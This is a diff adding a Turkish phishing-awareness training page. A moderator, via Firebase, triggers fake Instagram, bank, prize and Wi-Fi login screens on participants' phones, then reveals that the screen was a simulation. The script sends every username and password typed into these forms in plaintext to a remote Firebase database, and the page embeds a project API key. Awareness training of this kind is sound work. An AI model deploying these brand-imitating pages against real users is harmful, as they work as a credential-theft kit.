@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Siber Güvenlik</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#1e3c72,#2a5298);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:10px}
+        .phone{width:100%;max-width:380px;background:#1a1a1a;border-radius:40px;padding:12px;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
+        .screen{background:#fff;border-radius:30px;min-height:650px;overflow:hidden}
+        .join{padding:40px 25px;text-align:center}
+        .join h1{font-size:1.6em;color:#333;margin-bottom:10px}
+        .join p{color:#666;margin-bottom:30px}
+        .code-box{background:#f5f5f5;border:2px solid #ddd;border-radius:15px;padding:15px;margin-bottom:20px}
+        .code-input{width:100%;border:none;background:transparent;font-size:1.4em;text-align:center;font-weight:bold;color:#333;text-transform:uppercase;letter-spacing:2px;outline:none}
+        .btn{width:100%;padding:18px;background:#1877f2;color:#fff;border:none;border-radius:12px;font-size:1.1em;font-weight:600;cursor:pointer}
+        .btn:disabled{background:#ccc}
+        .error{background:#ffebee;color:#c62828;padding:12px;border-radius:10px;margin-top:15px;font-size:0.9em;display:none}
+        .wait{padding:60px 30px;text-align:center;display:none}
+        .shield{width:100px;height:100px;background:linear-gradient(135deg,#4caf50,#45a049);border-radius:50%;margin:0 auto 25px;display:flex;align-items:center;justify-content:center;font-size:3em;animation:pulse 2s infinite}
+        @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
+        .attack{display:none}
+        .banner{background:#ff4444;color:#fff;text-align:center;padding:12px;font-weight:600;animation:blink 1.5s infinite}
+        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.7}}
+        .insta .header{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);color:#fff;text-align:center;padding:18px;font-weight:600;font-size:1.2em}
+        .bank .header{background:#e31837;color:#fff;text-align:center;padding:18px;font-weight:600;font-size:1.2em}
+        .prize{background:linear-gradient(180deg,#667eea,#764ba2);min-height:100%;padding:30px 20px;text-align:center;color:#fff}
+        .wifi .header{background:#2196f3;color:#fff;text-align:center;padding:18px;font-weight:600;font-size:1.2em}
+        .form{padding:20px}
+        input{width:100%;padding:15px;margin:8px 0;border:1px solid #dbdbdb;border-radius:8px;font-size:1em;background:#fafafa}
+        .submit{width:100%;padding:16px;margin-top:15px;border:none;border-radius:8px;font-size:1em;font-weight:600;cursor:pointer;color:#fff}
+        .s-insta{background:#0095f6}
+        .s-bank{background:#e31837}
+        .s-prize{background:#ffd700;color:#333}
+        .s-wifi{background:#2196f3}
+        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;justify-content:center;align-items:center;padding:20px}
+        .modal-content{background:#fff;border-radius:25px;padding:35px 25px;text-align:center;max-width:350px;width:100%}
+        .modal-title{color:#ff4444;font-size:1.5em;margin-bottom:15px;font-weight:bold}
+        .data-box{background:#ffebee;border:2px solid #ff4444;border-radius:12px;padding:15px;margin:15px 0;text-align:left;font-family:'Courier New',monospace;font-size:0.85em;line-height:1.8}
+        .modal-btn{width:100%;padding:16px;background:#4caf50;color:#fff;border:none;border-radius:12px;font-size:1em;font-weight:600;cursor:pointer}
+    </style>
+</head>
+<body>
+    <div class="phone">
+        <div class="screen" id="main">
+            <div class="join" id="join">
+                <h1>🔐 Oturuma Katıl</h1>
+                <p>Moderatörün verdiği kodu girin</p>
+                <div class="code-box">
+                    <input type="text" class="code-input" id="code" placeholder="SESSION-1234" autocomplete="off" autocorrect="off" autocapitalize="characters" spellcheck="false">
+                </div>
+                <button class="btn" id="joinBtn" onclick="join()">Katıl</button>
+                <div class="error" id="err"></div>
+            </div>
+            <div class="wait" id="wait">
+                <div class="shield">🛡️</div>
+                <h2>Güvenli Mod</h2>
+                <p>Şu an güvendesiniz.<br>Moderatör saldırı başlatırsa ekran değişecek.</p>
+                <div style="display:inline-block;background:#e8f5e9;color:#2e7d32;padding:10px 20px;border-radius:20px;margin-top:30px;font-weight:600" id="tag">👤 Kullanıcı</div>
+            </div>
+            <div class="attack" id="attack"></div>
+        </div>
+    </div>
+    <div class="modal" id="modal">
+        <div class="modal-content">
+            <div style="font-size:4em;margin-bottom:15px">⚠️</div>
+            <h2 class="modal-title">TUZAĞA DÜŞTÜNÜZ!</h2>
+            <p style="color:#333;line-height:1.6;margin-bottom:20px">Bu bir <strong>siber saldırı simülasyonuydu!</strong></p>
+            <div class="data-box" id="stolen"></div>
+            <button class="modal-btn" onclick="closeModal()">Anladım</button>
+        </div>
+    </div>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script>
+        const cfg={apiKey:"AIzaSyBdCy4UFD1-4i0jv3GyonbpA3A-6YvfZtg",authDomain:"siber-ac479.firebaseapp.com",databaseURL:"https://siber-ac479-default-rtdb.firebaseio.com",projectId:"siber-ac479",storageBucket:"siber-ac479.firebasestorage.app",messagingSenderId:"207466285432",appId:"1:207466285432:web:2007de2fe7f49c26f4608d"};
+        firebase.initializeApp(cfg);
+        const db=firebase.database();
+        let session=null,uid=null,uname=null;
+        function genName(){const a=['Aslan','Kartal','Kurt','Kaplan','Çita','Puma','Leopar','Jaguar'];return a[Math.floor(Math.random()*a.length)]+'-'+Math.floor(Math.random()*900+100)}
+        function showErr(m){const e=document.getElementById('err');e.textContent=m;e.style.display='block';setTimeout(()=>e.style.display='none',5000)}
+        function join(){const i=document.getElementById('code'),b=document.getElementById('joinBtn');let c=i.value.trim().toUpperCase();if(!c){showErr('Kod girin!');return}if(/^\d+$/.test(c))c='SESSION-'+c;if(!c.startsWith('SESSION-')){showErr('SESSION- ile başlamalı!');return}b.disabled=true;b.textContent='Bağlanıyor...';session=c;uid='u'+Date.now();uname=genName();db.ref('sessions/'+session+'/users/'+uid).set({name:uname,device:navigator.userAgent.match(/iPhone|iPad|iPod/)?'📱 iPhone':navigator.userAgent.match(/Android/)?'📱 Android':'📱 Telefon',joinTime:firebase.database.ServerValue.TIMESTAMP}).then(()=>{document.getElementById('join').style.display='none';document.getElementById('wait').style.display='block';document.getElementById('tag').textContent='👤 '+uname;listen()}).catch(e=>{b.disabled=false;b.textContent='Katıl';showErr('Hata: '+e.message)})}
+        function listen(){db.ref('sessions/'+session+'/attack').on('value',s=>{const a=s.val();if(a&&a.active)showAttack(a.type);else showWait()})}
+        function showWait(){document.getElementById('wait').style.display='block';document.getElementById('attack').style.display='none';document.getElementById('attack').innerHTML=''}
+        function showAttack(t){document.getElementById('wait').style.display='none';document.getElementById('attack').style.display='block';const s=document.getElementById('attack');let h='<div class="banner">⚠️ GÜVENLİK DOĞRULAMASI GEREKLİ</div>';switch(t){case'instagram':h+='<div class="insta"><div class="header">Instagram</div><div style="padding:40px 30px;text-align:center"><div style="font-size:4em;margin-bottom:30px">📷</div><div class="form"><input type="text" id="u" placeholder="Kullanıcı adı"><input type="password" id="p" placeholder="Şifre"><button class="submit s-insta" onclick="send(\'instagram\')">Giriş Yap</button></div></div></div>';break;case'bank':h+='<div class="bank"><div class="header">🏦 Güvenli Bankacılık</div><div style="background:#fff3cd;border-left:4px solid #ffc107;margin:15px;padding:15px;border-radius:8px;color:#856404"><strong>⚠️ Hesabınız Askıya Alındı!</strong></div><div class="form"><input type="text" id="u" placeholder="Müşteri No / TC"><input type="password" id="p" placeholder="Şifre"><button class="submit s-bank" onclick="send(\'bank\')">Doğrula</button></div></div>';break;case'prize':h+='<div class="prize"><div style="font-size:4em;margin-bottom:15px">🎉</div><h2>TEBRİKLER!</h2><div style="background:rgba(255,255,255,0.2);padding:25px;border-radius:20px;margin:20px 0"><div style="font-size:1.8em;font-weight:bold">iPhone 15 Pro</div><div>Kazandınız!</div></div><p style="margin-bottom:20px">Kargo bilgileri:</p><div class="form" style="padding:0"><input type="text" id="u" placeholder="Ad Soyad" style="margin:5px 0"><input type="tel" id="p" placeholder="Telefon" style="margin:5px 0"><button class="submit s-prize" onclick="send(\'prize\')">Ödülümü Al</button></div></div>';break;case'wifi':h+='<div class="wifi"><div class="header">📶 Wi-Fi Bağlantısı</div><div style="background:#fff;margin:15px;padding:20px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,0.1)"><strong>Meb_Guest_Free</strong><br><span style="color:#666;font-size:0.9em">Güvenli İnternet</span></div><p style="text-align:center;color:#666;margin:15px">Giriş yapın:</p><div class="form"><input type="email" id="u" placeholder="E-posta"><input type="password" id="p" placeholder="Şifre"><button class="submit s-wifi" onclick="send(\'wifi\')">Bağlan</button></div></div>'}s.innerHTML=h}
+        function send(t){const u=document.getElementById('u')?.value||'Boş',p=document.getElementById('p')?.value||'Boş';db.ref('sessions/'+session+'/captured').push({userName:uname,attackType:t,username:u,password:p,timestamp:firebase.database.ServerValue.TIMESTAMP});document.getElementById('stolen').innerHTML='<strong>Kullanıcı:</strong> '+u+'<br><strong>Şifre:</strong> '+p+'<br><strong>Tür:</strong> '+t.toUpperCase()+'<br><strong>Saat:</strong> '+new Date().toLocaleTimeString();document.getElementById('modal').style.display='flex'}
+        function closeModal(){document.getElementById('modal').style.display='none';showWait()}
+        document.getElementById('code').addEventListener('keypress',e=>{if(e.key==='Enter')join()});
+        document.getElementById('code').addEventListener('input',function(){this.value=this.value.toUpperCase()});
+    </script>
+</body>
+</html>
